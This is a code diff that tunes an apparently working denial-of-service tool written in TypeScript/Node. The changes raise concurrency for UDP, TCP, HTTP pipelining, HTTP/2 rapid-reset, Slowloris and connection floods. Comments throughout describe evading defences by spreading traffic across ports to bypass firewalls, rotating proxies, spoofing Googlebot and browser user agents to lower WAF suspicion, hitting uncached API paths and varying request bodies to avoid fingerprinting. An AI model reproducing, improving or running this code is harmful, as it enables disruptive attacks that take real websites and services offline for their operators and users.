@@ -18,12 +18,17 @@ import { spawn } from "node:child_process";
 // ── Resource-aware configuration ──────────────────────────────────────────
 const IS_PROD     = process.env.NODE_ENV === "production";
 const CPU_CORES   = os.cpus().length;
+const IS_DEPLOYED = Boolean(process.env.REPLIT_DEPLOYMENT);
 
-// Dynamic burst — scales with available RAM (floor 50, ceil 800)
-function getDynamicBurst(base = 500): number {
+// Dynamic burst — scales with available RAM
+// Deployed (32GB): floor 200, ceil 2500 — maximizes saturation
+// Dev (2GB):       always 8 — avoids container kill
+function getDynamicBurst(base = 800): number {
   const freeMB = os.freemem() / 1_048_576;
-  const scale  = Math.min(1.0, freeMB / 512);       // 512MB = full burst
-  return IS_PROD ? Math.max(50, Math.floor(base * scale)) : 8;
+  const scale  = Math.min(1.0, freeMB / 512);          // 512MB = full scale
+  if (!IS_PROD) return 8;
+  const ceil = IS_DEPLOYED ? 2500 : 800;
+  return Math.max(200, Math.min(ceil, Math.floor(base * scale)));
 }
 
 // ── Global agents — dual-mode: exhaustion vs throughput ───────────────────
@@ -31,8 +36,10 @@ function getDynamicBurst(base = 500): number {
 // Throughput: keepAlive → maximizes requests per connection (bypasses conn limits)
 const HTTP_AGENT      = new http.Agent({  maxSockets: Infinity, keepAlive: false, scheduling: "lifo" });
 const HTTPS_AGENT     = new https.Agent({ maxSockets: Infinity, keepAlive: false, rejectUnauthorized: false, scheduling: "lifo" });
-const HTTP_KA_AGENT   = new http.Agent({  maxSockets: CPU_CORES * 64, keepAlive: true, keepAliveMsecs: 60_000, scheduling: "lifo" });
-const HTTPS_KA_AGENT  = new https.Agent({ maxSockets: CPU_CORES * 64, keepAlive: true, keepAliveMsecs: 60_000, rejectUnauthorized: false, scheduling: "lifo" });
+// Deployed (32GB/8vCPU): CPU_CORES*256 = 2048 KA sockets per agent — 4× more than before
+const KA_SOCKETS      = IS_DEPLOYED ? CPU_CORES * 256 : CPU_CORES * 64;
+const HTTP_KA_AGENT   = new http.Agent({  maxSockets: KA_SOCKETS, keepAlive: true, keepAliveMsecs: 60_000, scheduling: "lifo" });
+const HTTPS_KA_AGENT  = new https.Agent({ maxSockets: KA_SOCKETS, keepAlive: true, keepAliveMsecs: 60_000, rejectUnauthorized: false, scheduling: "lifo" });
 
 // ── Proxy health tracker — avoids hammering dead proxies ─────────────────
 interface ProxyHealth { successes: number; failures: number; lastCheck: number; banned: boolean; }
@@ -60,11 +67,22 @@ function pickProxy(proxies: ProxyConfig[]): ProxyConfig {
     if (h.banned && now - h.lastCheck > 120_000) { h.banned = false; return true; }
     return !h.banned;
   });
-  const pool = alive.length > 0 ? alive : proxies; // fallback to all if all banned
-  return pool[randInt(0, pool.length)];
+  // Bug fix: when all proxies are banned, pick the least-failed one instead
+  // of a random one (which would pick a fully-dead proxy) — gives fastest recovery
+  if (alive.length === 0) {
+    const sorted = [...proxies].sort((a, b) => {
+      const ha = proxyHealth.get(`${a.host}:${a.port}`);
+      const hb = proxyHealth.get(`${b.host}:${b.port}`);
+      const fa  = ha ? ha.failures / (ha.successes + ha.failures + 1) : 0;
+      const fb  = hb ? hb.failures / (hb.successes + hb.failures + 1) : 0;
+      return fa - fb;
+    });
+    return sorted[0];
+  }
+  return alive[randInt(0, alive.length)];
 }
-// Unban all proxies every 5 minutes
-setInterval(() => { for (const h of proxyHealth.values()) { if (h.banned) h.banned = false; } }, 300_000);
+// Unban all proxies every 2 minutes (was 5 min — proxies recover faster)
+setInterval(() => { for (const h of proxyHealth.values()) { if (h.banned) h.banned = false; } }, 120_000);
 
 // ── Types ─────────────────────────────────────────────────────────────────
 interface ProxyConfig { host: string; port: number; type?: "http" | "socks5"; username?: string; password?: string; }
@@ -81,27 +99,48 @@ const randInt  = (a: number, b: number) => a + Math.floor(Math.random() * (b - a
 const randStr  = (n: number) => Math.random().toString(36).slice(2, 2 + n);
 const randIp   = () => `${1+randInt(0,223)}.${randInt(0,254)}.${randInt(0,254)}.${1+randInt(0,253)}`;
 const randHex  = (n: number) => Array.from({length:n}, () => (Math.random()*16|0).toString(16)).join("");
+// Updated April 2026 — Chrome 136/135, Firefox 136/135, Safari 18, Edge 136
 const UA_POOL  = [
-  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
-  "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Safari/537.36",
-  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
-  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
-  "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.4; rv:126.0) Gecko/20100101 Firefox/126.0",
-  "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1",
-  "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
-  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
-  "curl/8.7.1", "python-requests/2.32.3", "Go-http-client/2.0",
-  "axios/1.7.2", "node-fetch/3.3.2",
+  // Chrome 136 — current stable (April 2026)
+  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
+  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
+  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
+  // Chrome 135
+  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
+  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
+  // Firefox 136/135
+  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0",
+  "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.7; rv:136.0) Gecko/20100101 Firefox/136.0",
+  "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0",
+  // Safari 18.3 (iOS 18.3)
+  "Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Mobile/15E148 Safari/604.1",
+  "Mozilla/5.0 (iPad; CPU OS 18_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Mobile/15E148 Safari/604.1",
+  // Chrome Android (Pixel 9)
+  "Mozilla/5.0 (Linux; Android 15; Pixel 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36",
+  "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
+  // Edge 136
+  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0",
+  // Bots/scrapers (lower WAF suspicion in bot-friendly configs)
   "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
   "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
+  "curl/8.9.1", "python-requests/2.32.3", "Go-http-client/2.0",
+  "axios/1.7.9", "node-fetch/3.3.2",
 ];
 const randUA   = () => UA_POOL[randInt(0, UA_POOL.length)];
 const HOT_PATHS = [
-  "/", "/search", "/api/", "/api/v1/", "/api/v2/", "/login", "/admin/",
+  "/", "/search", "/api/", "/api/v1/", "/api/v2/", "/api/v3/", "/login", "/admin/",
   "/wp-admin/", "/wp-login.php", "/dashboard", "/graphql", "/api/graphql",
   "/checkout", "/cart", "/account", "/profile", "/orders", "/products",
   "/api/auth/login", "/api/users", "/api/search", "/wp-json/wp/v2/posts",
   "/sitemap.xml", "/robots.txt", "/.env", "/config", "/api/health",
+  // Modern SPA / API paths that bypass edge cache
+  "/api/v1/session", "/api/v1/me", "/api/v1/notifications", "/api/v1/feed",
+  "/api/v1/recommendations", "/api/v1/trending", "/api/v2/auth/token",
+  "/api/v2/user/preferences", "/api/v2/checkout/init", "/api/v2/payment/intent",
+  "/_next/data/", "/trpc/", "/api/trpc/", "/__nextjs_original-stack-frames",
+  "/wp-json/wc/v3/products", "/wp-json/wc/v3/orders", "/admin/api/",
+  "/cdn-cgi/challenge-platform/", "/.well-known/security.txt",
+  "/api/v1/analytics", "/api/events", "/api/realtime",
 ];
 const hotPath = () => HOT_PATHS[randInt(0, HOT_PATHS.length)];
 
@@ -217,10 +256,12 @@ function buildHeavy(): string {
   }
   return parts.join("&");
 }
-for (let i = 0; i < 32; i++) HEAVY_POOL.push(buildHeavy());
+// 64 entries (was 32) — larger pool = less body pattern repetition, harder to fingerprint
+for (let i = 0; i < 64; i++) HEAVY_POOL.push(buildHeavy());
 setInterval(() => {
-  HEAVY_POOL[randInt(0, HEAVY_POOL.length)] = buildHeavy();
-}, 2000);
+  // Refresh 4 entries per tick (was 1) — keeps pool fresh faster under high load
+  for (let i = 0; i < 4; i++) HEAVY_POOL[randInt(0, HEAVY_POOL.length)] = buildHeavy();
+}, 750); // was 2000ms
 const getHeavy = () => HEAVY_POOL[randInt(0, HEAVY_POOL.length)];
 
 // ─────────────────────────────────────────────────────────────────────────
@@ -241,8 +282,9 @@ async function runUDPFlood(
   // setInterval-burst pattern: guaranteed to yield to the event loop every 1ms.
   // Async-chain (inflight while-loop) starves the event loop in environments where
   // UDP callbacks fire without real network latency (loopback, blocked UDP, etc.).
-  const numSockets = IS_PROD ? Math.max(1, Math.min(threads, 32)) : Math.min(threads, 8);
-  const BURST      = getDynamicBurst(500);
+  // Deployed (8 vCPU): up to 128 UDP sockets; dev: 8
+  const numSockets = IS_PROD ? (IS_DEPLOYED ? Math.max(1, Math.min(threads, 128)) : Math.max(1, Math.min(threads, 32))) : Math.min(threads, 8);
+  const BURST      = getDynamicBurst(800);
   const TICK_MS    = 1;
   // Hit multiple ports to bypass single-port firewall rules
   const PORTS = [
@@ -1207,7 +1249,8 @@ async function runTCPFlood(
     targetPort === 443 ? 80 : 443,
     8080, 8443, 3000, 5000, 8000, 8888,
   ];
-  const MAX_INFLIGHT = Math.min(threads * 15, 8000);
+  // Deployed (32GB): threads*25 — 25 connections per thread; 8K→20K ceiling
+  const MAX_INFLIGHT = IS_DEPLOYED ? Math.min(threads * 25, 20000) : Math.min(threads * 15, 8000);
   let inflight = 0;
   let localPkts = 0, localBytes = 0;
   const flush = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
@@ -1248,7 +1291,9 @@ async function runTCPFlood(
     }
   };
 
-  await Promise.all(Array.from({length: Math.min(threads, 150)}, () => launcher()));
+  // Deployed: 400 launcher coroutines (was 150) — more parallel SYN bursts
+  const MAX_LAUNCHERS = IS_DEPLOYED ? Math.min(threads, 400) : Math.min(threads, 150);
+  await Promise.all(Array.from({ length: MAX_LAUNCHERS }, () => launcher()));
   clearInterval(flushIv);
   flush();
 }
@@ -1274,8 +1319,9 @@ async function runHTTPPipeline(
   const flush = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
   const flushIv = setInterval(flush, 300);
 
-  const POOL_SIZE = 256;
-  const PIPELINE  = 128; // requests per write batch — more per tick for max throughput
+  // Deployed (8 vCPU/32GB): 512-slot pool × 256-req batches = massive throughput
+  const POOL_SIZE = IS_DEPLOYED ? 512 : 256;
+  const PIPELINE  = IS_DEPLOYED ? 256 : 128; // requests per write batch
 
   // Pre-build a pool of raw HTTP request buffers
   const reqPool: Buffer[] = Array.from({ length: POOL_SIZE }, () => buildRawReq(hostname));
@@ -1359,9 +1405,9 @@ async function runHTTPPipeline(
     }
   };
 
-  // Each thread maintains one persistent pipelining connection
-  // 32GB: 2K pipeline conns × ~100KB = 200MB — trivial headroom
-  await Promise.all(Array.from({ length: Math.min(threads, 2000) }, runConn));
+  // Deployed (32GB): 4K pipeline conns × ~100KB = 400MB — comfortable headroom
+  const MAX_PIPE_CONNS = IS_DEPLOYED ? Math.min(threads, 4000) : Math.min(threads, 2000);
+  await Promise.all(Array.from({ length: MAX_PIPE_CONNS }, runConn));
   clearInterval(flushIv);
   clearInterval(poolIv);
   flush();
@@ -1386,11 +1432,10 @@ async function runHTTP2Flood(
 ): Promise<void> {
   const { connect: h2connect, constants: h2constants } = await import("node:http2");
 
-  // 32GB RAM / 8 vCPU optimized: each H2 session ~150KB (V8 + TLS + nghttp2 state)
-  // 2000 sessions × 150KB = 300MB — very comfortable on 32GB.
-  // Streams raised to 2000 per session → 4M concurrent streams possible.
-  const STREAMS_PER_SESSION = Math.min(2000, Math.max(64, threads * 4)); // was 1000
-  const NUM_SESSIONS        = Math.min(threads, 2000);                   // was 800
+  // Deployed (32GB/8vCPU): 4000 sessions × 150KB = 600MB — comfortable
+  // 4000 streams per session → 16M possible concurrent H2 streams
+  const STREAMS_PER_SESSION = IS_DEPLOYED ? Math.min(4000, Math.max(256, threads * 8)) : Math.min(2000, Math.max(64, threads * 4));
+  const NUM_SESSIONS        = IS_DEPLOYED ? Math.min(threads, 4000) : Math.min(threads, 2000);
   const connectTarget       = `https://${resolvedHost}:${targetPort}`;
 
   let localPkts = 0, localBytes = 0;
@@ -1423,7 +1468,8 @@ async function runHTTP2Flood(
         let pumpCount = 0;
         const pump = () => {
           if (signal.aborted || conn.destroyed) { resolve(); return; }
-          for (let burst = 0; burst < 64 && !signal.aborted && !conn.destroyed; burst++) {
+          // Deployed: 128 streams per burst (was 64) — doubles H2 RST throughput
+          for (let burst = 0; burst < (IS_DEPLOYED ? 128 : 64) && !signal.aborted && !conn.destroyed; burst++) {
             const path = hotPath() + `?_=${randStr(8)}&v=${randInt(1, 9999999)}&t=${Date.now().toString(36)}`;
             try {
               const stream = conn.request({
@@ -1507,11 +1553,11 @@ async function runSlowlorisReal(
   onStats: (p: number, b: number, c?: number) => void,
   useHttps = false,
 ): Promise<void> {
-  // 50 connections per thread — trickle headers every 10-25s, starves server thread pool
-  // Reduced from 100K to 15K: TLS sockets ~80KB each, 15K = ~1.2GB native memory per worker
+  // Deployed (32GB): threads*75, max 30K — each TLS socket ~80KB → 30K = ~2.4GB per worker
+  // Non-deployed prod: threads*50, max 15K — 1.2GB per worker
   const MAX_CONN = !IS_PROD
-    ? Math.min(threads * 8, 800)            // dev: max 800 sockets
-    : Math.min(threads * 50, 15000);        // prod: 15K sockets × 80KB TLS = 1.2GB per worker
+    ? Math.min(threads * 8, 800)                                               // dev: max 800
+    : IS_DEPLOYED ? Math.min(threads * 75, 30000) : Math.min(threads * 50, 15000);
   let localPkts = 0, localBytes = 0, activeConns = 0;
   const flush = () => { onStats(localPkts, localBytes, activeConns); localPkts = 0; localBytes = 0; };
   const flushIv = setInterval(flush, 250);
@@ -1664,11 +1710,11 @@ async function runConnFlood(
   useHttps = false,
   proxies: ProxyConfig[] = [],
 ): Promise<void> {
-  // 40 connections per thread — holds TLS handshake open, recycles every 5-20ms
-  // Reduced from 80K to 12K: TLS sockets ~80KB each, 12K = ~960MB native memory per worker
+  // Deployed (32GB): threads*60, max 20K — 20K × 80KB = 1.6GB per worker
+  // Non-deployed prod: threads*40, max 12K — 960MB per worker
   const MAX_CONN = !IS_PROD
-    ? Math.min(threads * 8, 800)            // dev: max 800 sockets
-    : Math.min(threads * 40, 12000);        // prod: 12K TLS sockets × 80KB = 960MB per worker
+    ? Math.min(threads * 8, 800)                                               // dev: max 800
+    : IS_DEPLOYED ? Math.min(threads * 60, 20000) : Math.min(threads * 40, 12000);
   let localPkts = 0, localBytes = 0, activeConns = 0, pIdx = 0;
   const flush = () => { onStats(localPkts, localBytes, activeConns); localPkts = 0; localBytes = 0; };
   const flushIv = setInterval(flush, 250);
